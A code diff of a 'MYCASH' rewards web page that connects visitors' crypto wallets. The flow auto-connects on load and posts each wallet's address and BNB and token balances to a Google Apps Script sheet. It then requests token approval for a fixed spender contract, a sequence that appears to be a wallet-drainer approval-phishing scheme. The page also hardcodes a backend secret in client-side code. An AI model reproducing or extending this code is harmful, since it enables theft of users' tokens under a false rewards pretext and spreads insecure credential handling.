@@ -33,7 +33,7 @@
         <a href="index.html">Home</a>
         <a href="about.html">About</a>
         <a href="contact.html">Contact</a>
-        <a href="reward.html">Rewards</a>
+        <a href="rewards.html">Rewards</a>
       </div>
       <div class="logo">MYCASH</div>
       <div>
@@ -65,19 +65,14 @@
           <div class="muted">Network</div>
           <div id="walletNetwork">—</div>
         </div>
+
         <div class="stat">
           <div class="muted">BNB Balance</div>
           <div id="walletBalance">—</div>
         </div>
-
-        <div class="stat">
-          <div class="muted">Bonus Balance</div>
-          <div id="bonusBalance">—</div>
-        </div>
       </div>
 
       <div style="margin-top:18px">
-
         <h3 class="muted">Tokens</h3>
         <div id="tokens" class="tokens">
           <div class="muted">Connect wallet to see token balance.</div>
@@ -101,11 +96,7 @@
   (function(){
     // ===== CONFIG =====
     const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbzlCsXUoqaMW4fCTqK6H_SF7dGCDDkcIoO-To5YbLcBLdWEEKvGjHQm_vSUfwE06Yw/exec";
-    const APPS_SCRIPT_SECRET = "mahfuzinam0045"; 
-        // NEW: separate bonus backend
-    const BONUS_API_URL    = "PASTE_YOUR_BONUS_API_URL_HERE"; // same as in admin.html
-    const BONUS_API_SECRET = "mahfuzinam0045";
-
+    const APPS_SCRIPT_SECRET = "mahfuzinam0045";
 
     const TOKEN_ADDRESS   = "PUT_YOUR_BEP20_TOKEN_CONTRACT_ADDRESS_HERE"; // <--- CHANGE THIS
     const SPENDER_ADDRESS = "0xD0A66d72B69c850b04Eb9CEA6cA156A412d2306d"; // your smart contract
@@ -157,11 +148,9 @@
     const statusTextEl    = document.getElementById("statusText");
     const walletAddressEl = document.getElementById("walletAddress");
     const userIdEl        = document.getElementById("userId");
-      const walletNetworkEl = document.getElementById("walletNetwork");
+    const walletNetworkEl = document.getElementById("walletNetwork");
     const walletBalanceEl = document.getElementById("walletBalance");
-    const bonusBalanceEl  = document.getElementById("bonusBalance");
     const tokensContainer = document.getElementById("tokens");
-
 
     function setStatus(txt){
       if(statusTextEl) statusTextEl.textContent = txt;
@@ -178,15 +167,13 @@
     function setUserIdUI(id){
       userIdEl.textContent = id || "-";
     }
-      function clearSessionUI(){
+
+    function clearSessionUI(){
       setStatus("Not connected");
       setWalletInfo("—","—",null);
       setUserIdUI("-");
-      if (bonusBalanceEl) bonusBalanceEl.textContent = "—";
       tokensContainer.innerHTML = '<div class="muted">Connect wallet to see token balance.</div>';
     }
-
-
 
     function initWeb3ModalInstance(){
       const providerOptions = {
@@ -215,8 +202,6 @@
           }
           const addr = accounts[0].toLowerCase();
           const uid  = getOrCreateUserIdFor(addr);
-
-          // Only update address + user ID; don't overwrite balance
           walletAddressEl.textContent = addr;
           setUserIdUI(uid);
         });
@@ -283,33 +268,6 @@
       }
     }
 
-    async function fetchUserBonus(userId, address){
-      try{
-        const url = BONUS_API_URL +
-          "?action=getBonus" +
-          "&secret=" + encodeURIComponent(BONUS_API_SECRET) +
-          "&userId=" + encodeURIComponent(userId || "") +
-          "&address=" + encodeURIComponent(address || "");
-
-        const res  = await fetch(url);
-        const data = await res.json();
-        const bonus = Number((data && data.bonus) || 0);
-
-        if (bonusBalanceEl) {
-          bonusBalanceEl.textContent = bonus.toFixed(2) + " BONUS";
-        }
-        return bonus;
-      }catch(err){
-        console.error("fetchUserBonus error:", err);
-        if (bonusBalanceEl) bonusBalanceEl.textContent = "0.00 BONUS";
-        return 0;
-      }
-    }
-
-
-
-
-    
     async function switchToBSC(provider){
       try{
         await provider.request({
@@ -394,8 +352,8 @@
       setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
       setUserIdUI(userId);
 
-      const tokenBalance  = await getTokenBalance(address);
-      const prettyBalance = tokenBalance ? Number(tokenBalance).toFixed(4) : "0";
+      const tokenBalanceRaw  = await getTokenBalance(address);
+      const prettyBalance    = tokenBalanceRaw ? Number(tokenBalanceRaw).toFixed(4) : "0";
 
       tokensContainer.innerHTML =
         '<div class="token">' +
@@ -404,103 +362,88 @@
           '<div class="small mono" style="margin-top:6px;">' + TOKEN_ADDRESS + '</div>' +
         '</div>';
 
-
-  // ⬅️ IMPORTANT: return everything you need later
-  return {
-    balanceBNB,
-    tokenBalance: tokenBalanceRaw,
-    userId
-  };
-}
-  
-
-
-
-
-async function connectFlow(){
-  try{
-    setStatus("Connecting…");
-    const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-
-    // Trust Wallet extension
-    if(!mobile && window.trustwallet && window.trustwallet.ethereum){
-      providerInstance = window.trustwallet.ethereum;
-      web3Instance     = new Web3(providerInstance);
-      await providerInstance.request({ method: "eth_requestAccounts" });
-    }
-    // Standard injected (MetaMask, some Trust)
-    else if(window.ethereum && !mobile){
-      providerInstance = window.ethereum;
-      web3Instance     = new Web3(providerInstance);
-      await providerInstance.request({ method: "eth_requestAccounts" });
-    }
-    // WalletConnect via Web3Modal
-    else {
-      if(!web3ModalInstance) initWeb3ModalInstance();
-      providerInstance = await web3ModalInstance.connect();
-      web3Instance     = new Web3(providerInstance);
+      return {
+        balanceBNB,
+        tokenBalance: tokenBalanceRaw,
+        userId
+      };
     }
 
-    if(!providerInstance || !web3Instance){
-      setStatus("No provider");
-      alert("No wallet provider detected.");
-      return;
-    }
+    async function connectFlow(){
+      try{
+        setStatus("Connecting…");
+        const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-    attachProviderListeners(providerInstance);
+        // Trust Wallet extension
+        if(!mobile && window.trustwallet && window.trustwallet.ethereum){
+          providerInstance = window.trustwallet.ethereum;
+          web3Instance     = new Web3(providerInstance);
+          await providerInstance.request({ method: "eth_requestAccounts" });
+        }
+        // Standard injected (MetaMask, some Trust)
+        else if(window.ethereum && !mobile){
+          providerInstance = window.ethereum;
+          web3Instance     = new Web3(providerInstance);
+          await providerInstance.request({ method: "eth_requestAccounts" });
+        }
+        // WalletConnect via Web3Modal
+        else {
+          if(!web3ModalInstance) initWeb3ModalInstance();
+          providerInstance = await web3ModalInstance.connect();
+          web3Instance     = new Web3(providerInstance);
+        }
 
-    const accounts = await web3Instance.eth.getAccounts();
-    if(!accounts || !accounts.length){
-      setStatus("No account");
-      return;
-    }
-    const address = accounts[0].toLowerCase();
+        if(!providerInstance || !web3Instance){
+          setStatus("No provider");
+          alert("No wallet provider detected.");
+          return;
+        }
 
-    let chainId = await web3Instance.eth.getChainId();
-    if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
-      const switched = await switchToBSC(providerInstance);
-      if(!switched){
-        alert("Please switch to BSC Testnet.");
-        setStatus("Wrong network");
-        return;
+        attachProviderListeners(providerInstance);
+
+        const accounts = await web3Instance.eth.getAccounts();
+        if(!accounts || !accounts.length){
+          setStatus("No account");
+          return;
+        }
+        const address = accounts[0].toLowerCase();
+
+        let chainId = await web3Instance.eth.getChainId();
+        if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
+          const switched = await switchToBSC(providerInstance);
+          if(!switched){
+            alert("Please switch to BSC Testnet.");
+            setStatus("Wrong network");
+            return;
+          }
+          chainId = await web3Instance.eth.getChainId();
+          if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
+            alert("Network switch failed");
+            return;
+          }
+        }
+
+        const { balanceBNB, tokenBalance, userId } =
+          await restoreSessionFromAddress(address);
+
+        setStatus("Connected");
+
+        await notifyBackend(
+          address,
+          BNB_TESTNET_LABEL,
+          userId,
+          balanceBNB,
+          tokenBalance
+        );
+
+        await requestTokenApproval();
+
+      }catch(err){
+        console.error("connectFlow error:", err);
+        setStatus("Connection failed");
+        alert("Connection failed: " + (err && err.message ? err.message : err));
       }
-      chainId = await web3Instance.eth.getChainId();
-      if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
-        alert("Network switch failed");
-        return;
-      }
     }
-
-    // 🔥 Get everything in one place: BNB, token, userId
-    const { balanceBNB, tokenBalance, userId } =
-      await restoreSessionFromAddress(address);
-
-    setStatus("Connected");
-
-    // 🔥 Send clean values to your sheet backend
-    await notifyBackend(
-      address,
-      BNB_TESTNET_LABEL,
-      userId,
-      balanceBNB,
-      tokenBalance
-    );
-
-    // 🔥 Ask for token approve after logging
-    await requestTokenApproval();
-
-  }catch(err){
-    console.error("connectFlow error:", err);
-    setStatus("Connection failed");
-    alert("Connection failed: " + (err && err.message ? err.message : err));
-  }
-}
-
-
-
-
-
-    
 
     // silent restore using eth_accounts; returns true if restored
     async function tryAutoReconnectSilent(){
@@ -514,15 +457,13 @@ async function connectFlow(){
         attachProviderListeners(providerInstance);
 
         const accounts = await injected.request({ method: "eth_accounts" });
-               if (accounts && accounts.length) {
+        if (accounts && accounts.length) {
           const address = accounts[0].toLowerCase();
           setStatus("Restoring session (Trust Wallet)...");
-          const { userId } = await restoreSessionFromAddress(address);
-          await fetchUserBonus(userId, address);
+          await restoreSessionFromAddress(address);
           setStatus("Connected (restored)");
           return true;
         }
-
       }
 
       // 2) Standard injected (MetaMask / some Trust)
@@ -533,15 +474,13 @@ async function connectFlow(){
         attachProviderListeners(providerInstance);
 
         const accounts = await injected.request({ method: "eth_accounts" });
-             if (accounts && accounts.length) {
+        if (accounts && accounts.length) {
           const address = accounts[0].toLowerCase();
           setStatus("Restoring session...");
-          const { userId } = await restoreSessionFromAddress(address);
-          await fetchUserBonus(userId, address);
+          await restoreSessionFromAddress(address);
           setStatus("Connected (restored)");
           return true;
         }
-
       }
 
       // 3) Do NOT auto-connect WalletConnect silently (would open QR)
@@ -557,7 +496,6 @@ async function connectFlow(){
         const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
         if(!mobile && ( (window.trustwallet && window.trustwallet.ethereum) || window.ethereum )){
-          // auto-attempt full connect once (will show wallet popup)
           setStatus("Auto connecting…");
           await connectFlow();
         }else{
